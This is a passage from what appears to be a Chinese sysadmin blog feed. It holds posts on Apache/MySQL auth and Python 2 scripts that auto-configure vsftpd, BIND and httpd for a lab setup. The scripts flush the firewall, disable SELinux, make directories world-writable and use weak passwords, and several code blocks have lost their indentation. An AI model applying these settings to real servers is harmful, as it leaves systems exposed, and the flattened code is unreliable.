install</code></p><p>然后遍历/tmp/to_remove的文件，删除对应安装位置的文件即可。</p><p>通过安装日志删除<br>安装日志里能够看得到到底安装了那些文件到那些位置，通常会使用’cp’或者’install’命令拷贝文件。可以事先记得记录’make install’的所有输出日志，’make install &amp;&gt; |tee make.log’。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;!--markdown--&gt;自行安装编译Linux软件过程中会执行三个步骤：./configure,make,make install。这三个步骤在安装过程中到底起到什么作用，先前一直糊里糊涂的，今天就来一起学习下。&lt;br&gt;&lt;br&gt;./configure(配置）&lt;br&gt;conf
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>apache 使用 mysql基本身份验证</title>
    <link href="https://vuln.top/2019/02/21/38/"/>
    <id>https://vuln.top/2019/02/21/38/</id>
    <published>2019-02-21T03:45:05.838Z</published>
    <updated>2019-02-21T03:45:05.848Z</updated>
    
    <content type="html"><![CDATA[<p><!--markdown-->第一步安装所有需要的组建(mysql,apache,apache_mysql认证)<br><code>yum install -y mysql-server mod_auth_mysql mysql httpd</code></p><p><img src="http://ovgfhrbzx.bkt.clouddn.com/18-3-16/2498692.jpg" alt></p><p>首先配置mysql 账号密码（这里我们就设置全明文验证）<br>设置mysql密码 <code>mysqladmin -u root password 123456</code><br>如果mysql 密码忘记了可以用这个命令<code>mysqladmin -u root flush-privileges password “newpassword”</code></p><p>登陆mysql<br><code>mysql -u root -p</code><br>创建数据库<br><code>create database httpauth;(一定要加;）</code><br>使用数据库<br><code>use httpauth;</code><br>创建表<br><code>create table auth(name char(25),pwd char(25));</code><br>写入auth数据库<br><code>INSERT INTO auth(name,pwd) VALUES(‘user03’,encrypt(111));</code><br><img src="http://ovgfhrbzx.bkt.clouddn.com/18-3-16/64913229.jpg" alt></p><p>我们访问到/etc/httpd/conf.d这个目录<br><img src="http://ovgfhrbzx.bkt.clouddn.com/18-3-16/61990036.jpg" alt></p><p>配置auth_mysql.conf<br>在最下面配置<br><img src="http://ovgfhrbzx.bkt.clouddn.com/18-3-16/61300409.jpg" alt></p><p>为什么我们在auth_mysql.conf 配置 主策略能读到<br><img src="http://ovgfhrbzx.bkt.clouddn.com/18-3-16/88433178.jpg" alt></p><p>启动服务<br><code>service httpd start</code></p><p><img src="http://ovgfhrbzx.bkt.clouddn.com/18-3-16/56655948.jpg" alt></p><p><img src="http://ovgfhrbzx.bkt.clouddn.com/18-3-16/82301276.jpg" alt></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;!--markdown--&gt;第一步安装所有需要的组建(mysql,apache,apache_mysql认证)&lt;br&gt;&lt;code&gt;yum install -y mysql-server mod_auth_mysql mysql httpd&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;i
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>centos 6.5 自动配置vsftp http dns</title>
    <link href="https://vuln.top/2019/02/21/37/"/>
    <id>https://vuln.top/2019/02/21/37/</id>
    <published>2019-02-21T03:45:05.822Z</published>
    <updated>2019-02-21T03:45:05.838Z</updated>
    
    <content type="html"><![CDATA[<!--markdown-->环境:centos6.5 配置本地yum源<br>python2.7<br>[vplayer url=”<a href="http://122.228.238.158/vhot2.qqvideo.tc.qq.com/AOREL4WspnvAOiKO2cu7iWM8_Jkp7CQb0aobV2cmLjNE/r0604x83i0v.mp4?sdtfrom=v1010&amp;guid=6ca265bc1a779fedafa760ae8c67e970&amp;vkey=9769DF585EE830B610269355CBFC259995D4ABA72034F79CA48EDB29EF38A798C6385ED8D040CD7C87F50045F7DDE1CCA7E48EE1C6756C4FCF166B7B280D8E3B27A984E4C5A2867DABDC6B347F0F38BA2E9990D0F68E7E4E61BAB188EB0E6FDD305FB63483D569E29E37DC016CC4DDB87BFAA9DC97E78070&quot;" target="_blank" rel="noopener">http://122.228.238.158/vhot2.qqvideo.tc.qq.com/AOREL4WspnvAOiKO2cu7iWM8_Jkp7CQb0aobV2cmLjNE/r0604x83i0v.mp4?sdtfrom=v1010&amp;guid=6ca265bc1a779fedafa760ae8c67e970&amp;vkey=9769DF585EE830B610269355CBFC259995D4ABA72034F79CA48EDB29EF38A798C6385ED8D040CD7C87F50045F7DDE1CCA7E48EE1C6756C4FCF166B7B280D8E3B27A984E4C5A2867DABDC6B347F0F38BA2E9990D0F68E7E4E61BAB188EB0E6FDD305FB63483D569E29E37DC016CC4DDB87BFAA9DC97E78070&quot;</a>  /]<br><br><br><br>使用方法:<br>1.首先使用第ws2018生成出用户和密码<br><code>命令:python ws2018.py -i [IP段] -n [多少用户]</code><br><code>python ws2018.py -i 192.168.1.1-192.168.1.10 -n 10</code><br>2.运行setservice<br><br>自动生成用户，ip脚本<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line">#coding=utf-8</span><br><span class="line"></span><br><span class="line">import optparse</span><br><span class="line">import random</span><br><span class="line"></span><br><span class="line">parse = optparse.OptionParser(usage=&quot;usage: %prog [options] args&quot;,version=&quot;1.1&quot;) #用optparse库设置参数</span><br><span class="line">parse.add_option(&apos;-n&apos;,dest=&apos;number&apos;,type=int,help=&apos;Student station number&apos;)</span><br><span class="line">parse.add_option(&apos;-i&apos;,dest=&apos;ip_addr&apos;,type=str,help=&apos;IP ADDRESS&apos;)</span><br><span class="line">options,args=parse.parse_args()</span><br><span class="line">print &apos;Example:python ws2018.py -n 5 -i 192.168.1.1-192.168.1.5&apos;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def ip2num(ip):  #ip地方范围</span><br><span class="line">    ips = [int(x) for x in ip.split(&apos;.&apos;)]</span><br><span class="line">    return ips[0]&lt;&lt; 24 | ips[1]&lt;&lt; 16 | ips[2] &lt;&lt; 8 | ips[3]</span><br><span class="line">def num2ip (num):</span><br><span class="line">    return &apos;%s.%s.%s.%s&apos; % ((num &gt;&gt; 24) &amp; 0xff, (num &gt;&gt; 16) &amp; 0xff, (num &gt;&gt; 8) &amp; 0xff, (num &amp; 0xff))</span><br><span class="line">    #return &apos;%s.%s.%s.%s&apos; % ((num &amp; 0xff000000)&gt;&gt;24,(num &amp; 0x00ff0000)&gt;&gt;16,(num &amp; 0x00000ff00)&gt;&gt;8,num &amp; 0x000000ff)</span><br><span class="line">def gen_ip(ip):</span><br><span class="line">    start ,end = [ip2num(x) for x in ip.split(&apos;-&apos;)]</span><br><span class="line">    return [num2ip(num) for num in range(start,end+1) if num &amp; 0xff]</span><br><span class="line"></span><br><span class="line">Ip = gen_ip(options.ip_addr)</span><br><span class="line">opt_num = options.number + 1</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">for g_number in range(1,opt_num):</span><br><span class="line"></span><br><span class="line">def salt(num):</span><br><span class="line">ws_id = &quot;ws&quot; + str(g_number)</span><br><span class="line"></span><br><span class="line">for salt_num in range(num):</span><br><span class="line">str_int = &quot;qwertyuiopasdfghjkzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM&quot; #随机生成8位密码</span><br><span class="line">sa = []</span><br><span class="line">for i in range(8):</span><br><span class="line">sa.append(random.choice(str_int))</span><br><span class="line">salt = &apos;&apos;.join(sa)</span><br><span class="line"></span><br><span class="line">test1 = &quot;%s,%d,%s,%s,%s&quot; % (ws_id,g_number,ws_id,salt,Ip[g_number-1])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">print test1</span><br><span class="line"></span><br><span class="line">a = open(&apos;./ws2018.csv&apos;,&apos;a&apos;)</span><br><span class="line">a.write(&quot;%s\n&quot;%test1)</span><br><span class="line">a.close()</span><br><span class="line">salt_number = salt(1)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#ip_dest = IPy.IP(&quot;%s&quot; % str(options.ip_addr)) # 生成ip</span><br><span class="line">#for ip_ADDR in ip_dest:</span><br><span class="line">#print ip_ADDR</span><br></pre></td></tr></table></figure><p>vsftp虚拟用户脚本<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line">import os</span><br><span class="line">import re</span><br><span class="line">import csv</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def ftp():</span><br><span class="line">cmd_yum = os.system(&apos;yum install vsftpd db_load httpd -y&apos;)</span><br><span class="line">with open(&apos;ws2018.csv&apos;,&apos;rb&apos;) as f:</span><br><span class="line">reader = csv.reader(f)</span><br><span class="line">for row in reader:</span><br><span class="line">vsuser = open(&quot;/etc/vsftpd/vsftpuser.txt&quot;,&apos;a&apos;)</span><br><span class="line">vsuser.write(&quot;%s\n%s\n&quot;%(row[2],row[3]))</span><br><span class="line">vsuser.close()</span><br><span class="line">vsf_make = os.system(&apos;mkdir -p /etc/user_dir_config&apos;)</span><br><span class="line">vsf_touch = os.system(&quot;touch /etc/user_dir_config/%s&quot;%row[2])</span><br><span class="line">vsf_write = open(&quot;/etc/user_dir_config/%s&quot;%row[2],&apos;w&apos;)</span><br><span class="line">vsf_payload0 = &quot;anon_world_readable_only=NO&quot;</span><br><span class="line">vsf_payload1 = &quot;anon_upload_enable=YES&quot;</span><br><span class="line">vsf_payload2 = &quot;anon_mkdir_write_enable=YES&quot;</span><br><span class="line">vsf_payload3 = &quot;anon_other_write_enable=YES&quot;</span><br><span class="line">vsf_payload4 = &quot;local_root=/mnt/ftp/%s&quot;%row[2]</span><br><span class="line">vsf_payload5 = &quot;write_enable=YES&quot;</span><br><span class="line"></span><br><span class="line">vsf_write.write(&quot;%s\n%s\n%s\n%s\n%s\n%s\n&quot;%(vsf_payload5,vsf_payload0,vsf_payload1,vsf_payload2,vsf_payload3,vsf_payload4))</span><br><span class="line">vsf_userhome = os.system(&quot;mkdir -p /mnt/ftp/%s&quot;%row[2])</span><br><span class="line">vsf_chmod = os.system(&quot;chmod 777 /mnt/ftp/%s&quot;%row[2])</span><br><span class="line"></span><br><span class="line">cmd_iptable = os.system (&apos;iptables -F &amp;&amp; service iptables save &amp;&amp; setenforce 0&apos;)</span><br><span class="line"></span><br><span class="line">cmd_load = os.system(&apos;db_load -T -t hash -f /etc/vsftpd/vsftpuser.txt /etc/vsftpd/vsftpuser.db &amp;&amp; chmod 600 /etc/vsftpd/vsftpuser.db&apos;)</span><br><span class="line">cmd_pam1 = os.system (&apos;cp /etc/pam.d/vsftpd /etc/pam.d/vsftpd.back&apos;)</span><br><span class="line">pam_write = open(&quot;/etc/pam.d/vsftpd&quot;,&apos;w&apos;)</span><br><span class="line">pam_payload1 = &quot;auth required /lib64/security/pam_userdb.so db=/etc/vsftpd/vsftpuser&quot;</span><br><span class="line">pam_payload2 = &quot;account required /lib64/security/pam_userdb.so db=/etc/vsftpd/vsftpuser&quot;</span><br><span class="line">pam_payload0 = &quot;#%PAM-1.0&quot;</span><br><span class="line">pam_write.write(&quot;%s\n%s\n%s\n&quot; %(pam_payload0,pam_payload1,pam_payload2))</span><br><span class="line">pam_write.close()</span><br><span class="line">cp_vsfconf = os.system(&quot;cp /etc/vsftpd/vsftpd.conf /etc/vsftpd/vsftpd.conf.back&quot;)</span><br><span class="line">vsf_conf = os.system(&quot;sed -i &apos;s/anonymous_enable=YES/anonymous_enable=NO/g&apos; /etc/vsftpd/vsftpd.conf&quot;)</span><br><span class="line">vsf_conf = os.system(&quot;sed -i &apos;s/#chroot_local_user=YES/chroot_local_user=YES/g&apos; /etc/vsftpd/vsftpd.conf&quot; )</span><br><span class="line">vsfconf_write = open(&quot;/etc/vsftpd/vsftpd.conf&quot;,&quot;a&quot;)</span><br><span class="line">vsfconf_write.write(&quot;\n%s\n%s\n%s\n&quot;%(&apos;guest_enable=YES&apos;,&apos;guest_username=ftpload&apos;,&apos;user_config_dir=/etc/user_dir_config&apos;))</span><br><span class="line">vsf_user = os.system(&apos;useradd -s /sbin/nologin ftpload&apos;)</span><br><span class="line">vsf_chmoduser = os.system(&apos;chmod a-w /home/ftpload&apos;)</span><br><span class="line">vsf_chkconfig = os.system(&apos;chkconfig --level 2345 vsftpd on&apos;)</span><br><span class="line">selinux_start = os.system(&quot;sed -i &apos;s/SELINUX=enforcing/SELINUX=disabled/g&apos; /etc/selinux/config&quot;)</span><br><span class="line"></span><br><span class="line">#vsf_conf = os.system(&quot;sed -i &apos;s/chroot_local_user=NO/chroot_local_user=YES/g&apos; /etc/vsftpd/vsftpd.conf&quot; )</span><br><span class="line">#server_vsftp1 = os.system(&quot;service vsftpd restart&quot;)</span><br><span class="line">ftp()</span><br><span class="line">server_vsftp = os.system(&quot;service vsftpd start&quot;)</span><br><span class="line"></span><br><span class="line">print &quot;You Service Start The Success&quot;</span><br><span class="line">&apos;&apos;&apos;</span><br><span class="line">vsconf = open(&quot;/etc/vsftpd/vsftpd.conf&quot;,&apos;a&apos;)</span><br><span class="line">vsconf_py = &quot;%s\r\n%s&quot;%(guest_enable=yes,)</span><br><span class="line">vsconf.write(str(&quot;guest_enable=yes\r\n&quot;))</span><br><span class="line">&apos;&apos;&apos;</span><br></pre></td></tr></table></figure></p><p>配置dns<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">import os</span><br><span class="line">import csv</span><br><span class="line"></span><br><span class="line">def dns(local_ip):</span><br><span class="line">    main_path = &apos;/var/named/chroot/etc/named.conf&apos;</span><br><span class="line">    rfc_path = &apos;/var/named/chroot/etc/named.rfc1912.zones&apos;</span><br><span class="line">    quyu_path = &apos;/var/named/chroot/var/named&apos;</span><br><span class="line">    quyu_path1 = &apos;/var/named/chroot/var/named/chinaskills.com.zone&apos;</span><br><span class="line">    dns_yum = os.system(&quot;yum install bind bind-utils bind-chroot -y&quot;)</span><br><span class="line">    dns_cpconf = os.system(&quot;cp /etc/named.* /var/named/chroot/etc/. &amp;&amp; cp /var/named/named.* %s/.&quot;%quyu_path)</span><br><span class="line">    dns_maincf = os.system(&quot;sed -i &apos;s/127.0.0.1/any/g&apos; %s&quot;%main_path)</span><br><span class="line">    dns_maincf2 = os.system(&quot;sed -i &apos;s/listen-on-v6/#listen-on-v6/g&apos; %s&quot;%main_path)</span><br><span class="line">    dns_maincf3 = os.system(&quot;sed -i &apos;s/localhost;/any;/g&apos; %s&quot;%main_path)</span><br><span class="line">    dns_maincf4 = os.system(&quot;sed -i &apos;s/dnssec-enable yes/dnssec-enable no/g&apos; %s&quot;%main_path)</span><br><span class="line">    dns_maincf5 = os.system(&quot;sed -i &apos;s/dnssec-validation yes/dnssec-validation no/g&apos; %s&quot;%main_path)</span><br><span class="line">    dnsrfc_payload1 = &quot;zone \&quot;chinaskills.com\&quot; IN &#123;&quot;</span><br><span class="line">    dnsrfc_payload2 = &quot;type master;&quot;</span><br><span class="line">    dnsrfc_payload3 = &quot;file \&quot;chinaskills.com.zone\&quot;;&quot;</span><br><span class="line">    dnsrfc_payload4 = &quot;allow-update &#123; none; &#125;;\n&#125;;&quot;</span><br><span class="line">    dnsrfc_write = open(&quot;%s&quot;%rfc_path,&apos;a&apos;)</span><br><span class="line">    dnsrfc_write.write(&quot;\n%s\n%s\n%s\n%s\n&quot;%(dnsrfc_payload1,dnsrfc_payload2,dnsrfc_payload3,dnsrfc_payload4))</span><br><span class="line">    dnsrfc_write.close()</span><br><span class="line">    dns_touch = os.system(&quot;cp %s/named.empty %s/chinaskills.com.zone&quot;%(quyu_path,quyu_path))</span><br><span class="line">    dns_quyu = os.system(&quot;sed -i &apos;s/@ rname.invalid./dns.chinaskills.com. root.chinaskills.com./g&apos; %s&quot;%quyu_path1)</span><br><span class="line">    for i in range(1,4):</span><br><span class="line">        dns_quyu1 = os.system(&quot;sed -i &apos;8d&apos; %s&quot;%quyu_path1)</span><br><span class="line">    dns_payload = &apos; &apos;*8+&apos;NS&apos;+&apos; &apos;*4+&apos;dns.chinaskills.com.&apos;</span><br><span class="line">    dns_payload1 = &apos;dns&apos;+&apos; &apos;*4+&apos;A&apos;+4*&apos; &apos;+str(local_ip)</span><br><span class="line">    dnsqy_write = open(&quot;%s&quot;%quyu_path1,&apos;a&apos;)</span><br><span class="line">    dnsqy_write.write(&quot;%s\n%s&quot;%(dns_payload,dns_payload1))</span><br><span class="line">    dnsqy_write.close()</span><br><span class="line">    with open(&apos;ws2018.csv&apos;,&apos;rb&apos;) as f:</span><br><span class="line">reader = csv.reader(f)</span><br><span class="line">for row in reader:</span><br><span class="line">dnsqy1_open = open(&quot;%s&quot;%quyu_path1,&apos;a&apos;)</span><br><span class="line">dnsqy1_open.write(&quot;\n%s    A    %s\n&quot;%(row[0],row[4]))</span><br><span class="line">dnsqy1_open.close()</span><br><span class="line">    dnschown = os.system(&quot;chown -R named:named /var/named/chroot&quot;)</span><br><span class="line">    dns_chkconfig = os.system(&apos;chkconfig --level 2345 named on&apos;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">dns(&apos;192.168.1.1&apos;)</span><br><span class="line">dns_server = os.system(&quot;service named start&quot;)</span><br></pre></td></tr></table></figure></p><p>配置http<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">import csv</span><br><span class="line">import os</span><br><span class="line"></span><br><span class="line">def http():</span><br><span class="line">http_pyvirt = [&apos;&lt;VirtualHost *:80&gt;&apos;,&apos;ServerAdmin root@chinaskills.com&apos;,&apos;DocumentRoot&apos;,&apos;ServerName&apos;\</span><br><span class="line">,&apos;&lt;/VirtualHost&gt;&apos;]</span><br><span class="line">http_pydire = [&apos;&lt;Directory &quot;/&quot;&gt;&apos;,&apos;Options FollowSymLinks&apos;,&apos;AllowOverride None&apos;,&apos;Order allow,deny&apos;,&apos;Allow from all&apos;,\</span><br><span class="line">&apos;&lt;/Directory&gt;&apos;]</span><br><span class="line">hp_mp = &quot;/etc/httpd/conf/httpd.conf&quot;</span><br><span class="line">hp_uspt = &quot;/etc/httpd/conf.d&quot;</span><br><span class="line">http_yum = os.system(&apos;yum install httpd -y&apos;)</span><br><span class="line">http_sed = os.system(&quot;sed -i &apos;s/#NameVirtualHost/NameVirtualHost/g&apos; %s&quot;%hp_mp)</span><br><span class="line">with open(&apos;ws2018.csv&apos;,&apos;rb&apos;) as f:</span><br><span class="line">reader = csv.reader(f)</span><br><span class="line">for row in reader:</span><br><span class="line">hp_ftppt = &quot;/mnt/ftp/%s&quot;%row[0]</span><br><span class="line">hp_user = &quot;%s.chinaskills.com&quot;%row[0]</span><br><span class="line">hp_ip = &quot;allow from %s&quot;%row[4]</span><br><span class="line">hp_touch = os.system(&quot;touch %s/%s.conf&quot;%(hp_uspt,row[0]))</span><br><span class="line">hp_sed1 = os.system(&quot;sed -i &apos;s/User apache/User ftpload/g&apos; %s&quot;%hp_mp)</span><br><span class="line">hp_sed2 = os.system(&quot;sed -i &apos;s/Group apache/Group ftpload/g&apos; %s&quot;%hp_mp)</span><br><span class="line">http_open = open(&quot;%s/%s.conf&quot;%(hp_uspt,row[0]),&apos;a&apos;)</span><br><span class="line">http_open.write(&quot;%s\n%s\n%s %s\n%s %s\n%s\n%s\n%s\n%s\n%s\n%s\n%s&quot;%(http_pyvirt[0],http_pyvirt[1],http_pyvirt[2],hp_ftppt,\</span><br><span class="line">http_pyvirt[3],hp_user,http_pydire[0],http_pydire[1],http_pydire[2],http_pydire[3],hp_ip,http_pydire[5],http_pyvirt[4]))</span><br><span class="line">http_open.close()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">http()</span><br><span class="line">http_start = os.system(&quot;service httpd start&quot;)</span><br><span class="line">http_chkconfig = os.system(&quot;chkconfig --level 2345 httpd on&quot;)</span><br></pre></td></tr></table></figure></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;!--markdown--&gt;环境:centos6.5 配置本地yum源&lt;br&gt;python2.7&lt;br&gt;[vplayer url=”&lt;a href=&quot;http://122.228.238.158/vhot2.qqvideo.tc.qq.com/AOREL4WspnvAOiKO2
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>vsftpd 配置参数</title>
    <link href="https://vuln.top/2019/02/21/32/"/>
    <id>https://vuln.top/2019/02/21/32/</id>
    <published>2019-02-21T03:45:05.763Z</published>
    <updated>2019-02-21T03:45:05.775Z</updated>
    
    <content type="html"><![CDATA[<p><!--markdown--><code>local_root</code> #用户主目录<br><code>listen_address</code> #监听地址<br><code>listen_address6</code> #ipv6 监听地址<br><code>local_max_rate</code> #本地用户传输速率(byte)<br><code>anon_max_rate</code> #匿名用户传输速率(byte)<br><code>max_clients</code> #客户端最大连接数<br><code>data_connection_timeout</code> #数据连接超时<br><code>idle_session_timeout</code> #无任何操作超时<br><code>anonymous_enable</code> #是否允许匿名用户登陆<br><code>local_enable</code> #是否允许所在系统的用户登陆<br><code>write_enable</code> #允许进行写权限<br><code>local_umask</code> #对应文件上传权限644、目录权限755</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;!--markdown--&gt;&lt;code&gt;local_root&lt;/code&gt; #用户主目录&lt;br&gt;&lt;code&gt;listen_address&lt;/code&gt; #监听地址&lt;br&gt;&lt;code&gt;listen_address6&lt;/code&gt; #ipv6 监听地址&lt;br&gt;&lt;code&gt;lo
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>为某个项目写的简单生成csv的python脚本</title>
    <link href="https://vuln.top/2019/02/21/31/"/>
    <id>https://vuln.top/2019/02/21/31/</id>
    <published>2019-02-21T03:45:05.726Z</published>
    <updated>2019-02-21T03:45:05.739Z</updated>
    
    <content type="html"><![CDATA[<!--markdown--><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">#coding=utf-8</span><br><span class="line"></span><br><span class="line">import optparse</span><br><span class="line">import random</span><br><span class="line"></span><br><span class="line">parse = optparse.OptionParser(usage=&quot;usage:%parse [option] -n [number]&quot;,version=&quot;1.1&quot;) #用optparse库设置参数</span><br><span class="line">parse.add_option(&apos;-n&apos;,dest=&apos;number&apos;,type=int,help=&apos;Student station number&apos;)</span><br><span class="line">parse.add_option(&apos;-i&apos;,dest=&apos;ip_addr&apos;,type=str,help=&apos;IP ADDRESS&apos;)</span><br><span class="line">options,args=parse.parse_args()</span><br><span class="line">print &apos;If you want to see the help Handbook -h&apos;</span><br><span class="line"></span><br><span class="line">def ip2num(ip):  #ip地方范围</span><br><span class="line">    ips = [int(x) for x in ip.split(&apos;.&apos;)]</span><br><span class="line">    return ips[0]&lt;&lt; 24 | ips[1]&lt;&lt; 16 | ips[2] &lt;&lt; 8 | ips[3]</span><br><span class="line">def num2ip (num):</span><br><span class="line">    return &apos;%s.%s.%s.%s&apos; % ((num &gt;&gt; 24) &amp; 0xff, (num &gt;&gt; 16) &amp; 0xff, (num &gt;&gt; 8) &amp; 0xff, (num &amp; 0xff))</span><br><span class="line">    #return &apos;%s.%s.%s.%s&apos; % ((num &amp; 0xff000000)&gt;&gt;24,(num &amp; 0x00ff0000)&gt;&gt;16,(num &amp; 0x00000ff00)&gt;&gt;8,num &amp; 0x000000ff)</span><br><span class="line">def gen_ip(ip):</span><br><span class="line">    start ,end = [ip2num(x) for x in ip.split(&apos;-&apos;)]</span><br><span class="line">    return [num2ip(num) for num in range(start,end+1) if num &amp; 0xff]</span><br><span class="line">Ip = gen_ip(options.ip_addr)</span><br><span class="line"></span><br><span class="line">opt_num = options.number + 1</span><br><span class="line"></span><br><span class="line">for g_number in range(1,opt_num):</span><br><span class="line">def salt(num):</span><br><span class="line">ws_id = &quot;ws&quot; + str(g_number)</span><br><span class="line"></span><br><span class="line">for salt_num in range(num):</span><br><span class="line">str_int = &quot;qwertyuiopasdfghjkzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM&quot; #随机生成8位密码</span><br><span class="line">sa = []</span><br><span class="line">for i in range(8):</span><br><span class="line">sa.append(random.choice(str_int))</span><br><span class="line">salt = &apos;&apos;.join(sa)</span><br><span class="line"></span><br><span class="line">test1 = &quot;%s,%d,%s,%s,%s&quot; % (ws_id,g_number,ws_id,salt,Ip[g_number-1])</span><br><span class="line"></span><br><span class="line">print test1</span><br><span class="line"></span><br><span class="line">a = open(&apos;/Users/fidcer/Documents/ws2018/ws2018.csv&apos;,&apos;a&apos;)</span><br><span class="line">a.write(&quot;%s\r\n&quot;%test1 )</span><br><span class="line">a.close()</span><br><span class="line">salt_number = salt(1)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#ip_dest = IPy.IP(&quot;%s&quot; % str(options.ip_addr)) # 生成ip</span><br><span class="line">#for ip_ADDR in ip_dest:</span><br><span 